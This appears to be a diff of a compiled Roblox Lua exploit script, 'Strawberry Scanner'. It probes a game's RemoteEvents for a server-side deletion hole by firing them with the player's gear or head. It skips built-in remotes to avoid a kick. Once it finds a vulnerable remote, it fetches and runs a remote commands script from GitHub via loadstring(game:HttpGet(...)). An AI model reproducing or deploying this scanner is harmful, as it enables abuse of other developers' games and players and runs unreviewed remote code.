@@ -1,9 +1,11 @@
 -- DO NOT EDIT, THIS IS NOT MENT TO BE EDITED. THIS IS A COMPILED VERSION OF SCANNER.RBXMX
 -- IF YOU WANT TO MAKE CHANGES, EDIT SCANNER.RBXMX AND CONVERT IT BACK TO A SCANNER.LUA SCRIPT VIA GUI 2 LUA BY UNIQADEV
 -- AND ADD THIS WARNING MESSAGE
+
+-- Instances: 22 | Scripts: 3 | Modules: 0 | Tags: 0
 local G2L = {};
 
--- Workspace.StrawMain
+-- StarterGui.StrawMain
 G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 G2L["1"]["IgnoreGuiInset"] = true;
 G2L["1"]["DisplayOrder"] = 2147483647;
@@ -12,7 +14,7 @@ G2L["1"]["Name"] = [[StrawMain]];
 G2L["1"]["ResetOnSpawn"] = false;
 
 
--- Workspace.StrawMain.Scanner
+-- StarterGui.StrawMain.Scanner
 G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BorderSizePixel"] = 0;
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
@@ -24,7 +26,7 @@ G2L["2"]["Name"] = [[Scanner]];
 G2L["2"]["BackgroundTransparency"] = 1;
 
 
--- Workspace.StrawMain.Scanner.Glass
+-- StarterGui.StrawMain.Scanner.Glass
 G2L["3"] = Instance.new("ImageLabel", G2L["2"]);
 G2L["3"]["ZIndex"] = -2147483647;
 G2L["3"]["BorderSizePixel"] = 0;
@@ -40,17 +42,17 @@ G2L["3"]["Name"] = [[Glass]];
 G2L["3"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
 
 
--- Workspace.StrawMain.Scanner.Glass.UIGradient
+-- StarterGui.StrawMain.Scanner.Glass.UIGradient
 G2L["4"] = Instance.new("UIGradient", G2L["3"]);
 
 
 
--- Workspace.StrawMain.Scanner.Glass.UICorner
+-- StarterGui.StrawMain.Scanner.Glass.UICorner
 G2L["5"] = Instance.new("UICorner", G2L["3"]);
 G2L["5"]["CornerRadius"] = UDim.new(0, 10);
 
 
--- Workspace.StrawMain.Scanner.Shadow
+-- StarterGui.StrawMain.Scanner.Shadow
 G2L["6"] = Instance.new("ImageLabel", G2L["2"]);
 G2L["6"]["ZIndex"] = -30;
 G2L["6"]["BorderSizePixel"] = 0;
@@ -68,12 +70,12 @@ G2L["6"]["Name"] = [[Shadow]];
 G2L["6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
 
 
--- Workspace.StrawMain.Scanner.Shadow.UIGradient
+-- StarterGui.StrawMain.Scanner.Shadow.UIGradient
 G2L["7"] = Instance.new("UIGradient", G2L["6"]);
 G2L["7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 52, 88)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 52, 88))};
 
 
--- Workspace.StrawMain.Scanner.Gradient
+-- StarterGui.StrawMain.Scanner.Gradient
 G2L["8"] = Instance.new("Frame", G2L["2"]);
 G2L["8"]["ZIndex"] = -1000;
 G2L["8"]["BorderSizePixel"] = 0;
@@ -84,23 +86,23 @@ G2L["8"]["Name"] = [[Gradient]];
 G2L["8"]["BackgroundTransparency"] = 0.9;
 
 
--- Workspace.StrawMain.Scanner.Gradient.UIGradient
+-- StarterGui.StrawMain.Scanner.Gradient.UIGradient
 G2L["9"] = Instance.new("UIGradient", G2L["8"]);
 G2L["9"]["Rotation"] = -90;
 G2L["9"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(0.469, 1),NumberSequenceKeypoint.new(1.000, 1)};
 
 
--- Workspace.StrawMain.Scanner.Gradient.UICorner
+-- StarterGui.StrawMain.Scanner.Gradient.UICorner
 G2L["a"] = Instance.new("UICorner", G2L["8"]);
 G2L["a"]["CornerRadius"] = UDim.new(0, 10);
 
 
--- Workspace.StrawMain.Scanner.UICorner
+-- StarterGui.StrawMain.Scanner.UICorner
 G2L["b"] = Instance.new("UICorner", G2L["2"]);
 G2L["b"]["CornerRadius"] = UDim.new(0, 10);
 
 
--- Workspace.StrawMain.Scanner.Top
+-- StarterGui.StrawMain.Scanner.Top
 G2L["c"] = Instance.new("TextLabel", G2L["2"]);
 G2L["c"]["BorderSizePixel"] = 0;
 G2L["c"]["TextSize"] = 14;
@@ -115,12 +117,12 @@ G2L["c"]["Text"] = [[<b>Strawberry 🍓</b>: Scanner]];
 G2L["c"]["Name"] = [[Top]];
 
 
--- Workspace.StrawMain.Scanner.UIDrag
+-- StarterGui.StrawMain.Scanner.UIDrag
 G2L["d"] = Instance.new("LocalScript", G2L["2"]);
 G2L["d"]["Name"] = [[UIDrag]];
 
 
--- Workspace.StrawMain.Scanner.ScanBtn
+-- StarterGui.StrawMain.Scanner.ScanBtn
 G2L["e"] = Instance.new("TextButton", G2L["2"]);
 G2L["e"]["BorderSizePixel"] = 0;
 G2L["e"]["TextSize"] = 14;
@@ -136,12 +138,12 @@ G2L["e"]["Name"] = [[ScanBtn]];
 G2L["e"]["Position"] = UDim2.new(0.5, 0, 1, -35);
 
 
--- Workspace.StrawMain.Scanner.ScanBtn.UICorner
+-- StarterGui.StrawMain.Scanner.ScanBtn.UICorner
 G2L["f"] = Instance.new("UICorner", G2L["e"]);
 G2L["f"]["CornerRadius"] = UDim.new(0, 10);
 
 
--- Workspace.StrawMain.Scanner.ScanBtn.Glass
+-- StarterGui.StrawMain.Scanner.ScanBtn.Glass
 G2L["10"] = Instance.new("ImageLabel", G2L["e"]);
 G2L["10"]["ZIndex"] = -2147483647;
 G2L["10"]["BorderSizePixel"] = 0;
@@ -157,17 +159,17 @@ G2L["10"]["Name"] = [[Glass]];
 G2L["10"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
 
 
--- Workspace.StrawMain.Scanner.ScanBtn.Glass.UIGradient
+-- StarterGui.StrawMain.Scanner.ScanBtn.Glass.UIGradient
 G2L["11"] = Instance.new("UIGradient", G2L["10"]);
 
 
 
--- Workspace.StrawMain.Scanner.ScanBtn.Glass.UICorner
+-- StarterGui.StrawMain.Scanner.ScanBtn.Glass.UICorner
 G2L["12"] = Instance.new("UICorner", G2L["10"]);
 G2L["12"]["CornerRadius"] = UDim.new(0, 10);
 
 
--- Workspace.StrawMain.Scanner.ScanBtn.Shadow
+-- StarterGui.StrawMain.Scanner.ScanBtn.Shadow
 G2L["13"] = Instance.new("ImageLabel", G2L["e"]);
 G2L["13"]["ZIndex"] = -30;
 G2L["13"]["BorderSizePixel"] = 0;
@@ -185,22 +187,22 @@ G2L["13"]["Name"] = [[Shadow]];
 G2L["13"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
 
 
--- Workspace.StrawMain.Scanner.ScanBtn.Shadow.UIGradient
+-- StarterGui.StrawMain.Scanner.ScanBtn.Shadow.UIGradient
 G2L["14"] = Instance.new("UIGradient", G2L["13"]);
 G2L["14"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 52, 88)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 52, 88))};
 
 
--- Workspace.StrawMain.Scanner.ScanBtn.Function
+-- StarterGui.StrawMain.Scanner.ScanBtn.Function
 G2L["15"] = Instance.new("LocalScript", G2L["e"]);
 G2L["15"]["Name"] = [[Function]];
 
 
--- Workspace.StrawMain.Scanner.StrawScan
+-- StarterGui.StrawMain.Scanner.StrawScan
 G2L["16"] = Instance.new("LocalScript", G2L["2"]);
 G2L["16"]["Name"] = [[StrawScan]];
 
 
--- Workspace.StrawMain.Scanner.UIDrag
+-- StarterGui.StrawMain.Scanner.UIDrag
 local function C_d()
 local script = G2L["d"];
 	local UIS = game:GetService('UserInputService')
@@ -240,7 +242,7 @@ local script = G2L["d"];
 	
 end;
 task.spawn(C_d);
--- Workspace.StrawMain.Scanner.ScanBtn.Function
+-- StarterGui.StrawMain.Scanner.ScanBtn.Function
 local function C_15()
 local script = G2L["15"];
 	local TweenService = game:GetService("TweenService")
@@ -273,13 +275,13 @@ local script = G2L["15"];
 	
 end;
 task.spawn(C_15);
--- Workspace.StrawMain.Scanner.StrawScan
+-- StarterGui.StrawMain.Scanner.StrawScan
 local function C_16()
 local script = G2L["16"];
 	--[[
 	
 	/// StrawScan ///
-	/// Last updated: 9/8/2025 ///
+	/// Last updated: 9/15/2025 ///
 	
 	Strawberry's advanced remote event scanner component made by saji
 	Everything below will be explained with comments
@@ -307,23 +309,23 @@ local script = G2L["16"];
 	
 	local function isVulnerable(rmevent)
 		-- Stage 1: TestPart Allocation (for feeding it to remote events)
-		
+	
 		-- Attempts to get startergear which is a useless object we can use for testing
 		local TestPart = LocalPlayer:FindFirstChild("StarterGear")
 		if not TestPart then
 			warn("StrawScan // StarterGear not found, replacing with char head")
 			TestPart = Character:FindFirstChild("Head")
 		end -- If startergear is not found, it will try to test with the chars head
-		
+	
 		if not TestPart then
 			error("StrawScan // TestPart could not be found!")
 			return false
 		end -- If failed to find a testpart it will just quit and return as non vuln
-		
+	
 		-- Stage 2: Firing the remote and seeing if its vulnerable
-		
+	
 		rmevent:FireServer(TestPart)
-		
+	
 		local t = tick()
 		while tick() - t < MaxScanTime do
 			if isDestroyed(TestPart) then
@@ -331,10 +333,10 @@ local script = G2L["16"];
 				CurrentVulnerableRemote = rmevent
 				return true
 			end
-			
+	
 			task.wait()
 		end -- Actively checking if the remote event has responded
-		
+	
 		-- If you got to this point, the remote wasent vulnerable so we are returning false
 		print("StrawScan // Remote not vulnerable: " .. rmevent:GetFullName())
 		return false
@@ -345,38 +347,39 @@ local script = G2L["16"];
 	ScanButton.MouseButton1Click:Connect(function()
 		if AlreadyScanned then return end
 		AlreadyScanned = true
-		
+	
 		local Remotes = {}
 		local FoundRemote = false
-		
+	
 		-- goes through every remote and if its valid its added to the scan queue
 		for _, v in pairs(game:GetDescendants()) do
 			if v:IsA("RemoteEvent") then
 				if v ~= nil and v.Parent ~= nil and v.Parent.Name == "RobloxReplicatedStorage" then continue end
 				if v ~= nil and v.Parent ~= nil and v.Parent.Name == "DefaultChatSystemChatEvents" then continue end
 				-- Blocks remote events that are apart of roblox to speed up scan and prevent kick
-				
+	
 				FoundRemote = true
 				table.insert(Remotes, v)
 			end
 		end
-		
+	
 		if not FoundRemote then
 			ScanButton.TextSize = 12 -- sizing it down for the following message
 			ScanButton.Text = "Sorry, no vuln remotes" -- telling the pookie user that no remote is vuln :sadface:
-			
+	
 			return
 		end
-		
+	
 		-- counting for user cus why not
 		ScanButton.Text = "Scanning... (0/" .. tostring(#Remotes) .. ")"
-		
+	
 		-- scans and counts every remote inside the queue
 		for i, v in pairs(Remotes) do
 			ScanButton.Text = "Scanning... (" .. tostring(i) .. "/" .. tostring(#Remotes) .. ")"
-			
-			if isVulnerable(v) then
-				coroutine.wrap(function()
+	
+			local vulnerable = isVulnerable(v)
+			if vulnerable then
+				task.delay(0, function()
 					ScanButton.TextSize = 12 -- sizing it down for the following message
 					ScanButton.Text = "Vuln found, booting up" -- telling the pookie user that a vuln remote is found :happyface:
 	
@@ -387,22 +390,22 @@ local script = G2L["16"];
 					VulnRemote.Name = "StrawberryHookedRM"
 					VulnRemote.Value = CurrentVulnerableRemote
 	
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/release/commands.lua"))() -- loads up the commands script
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/nightly/commands.lua"))() -- loads up the commands script
 					task.wait(1) -- waits before removing the scanner UI
 					script.Parent.Parent:Destroy() -- removes the scanner UI
-				end)()
-				
+				end)
+	
 				break
 			end
 		end
-		
+	
 		if CurrentVulnerableRemote ~= nil and CurrentVulnerableRemote:IsA("RemoteEvent") then
 			return
 		end
-		
+	
 		ScanButton.TextSize = 12 -- sizing it down for the following message
 		ScanButton.Text = "Sorry, no vuln remotes" -- telling the pookie user that no remote is vuln :sadface:
-		
+	
 		return
 	end) -- // CRAP LOGIC THAT HANDLES THE SCANNNINGGGGG
 	
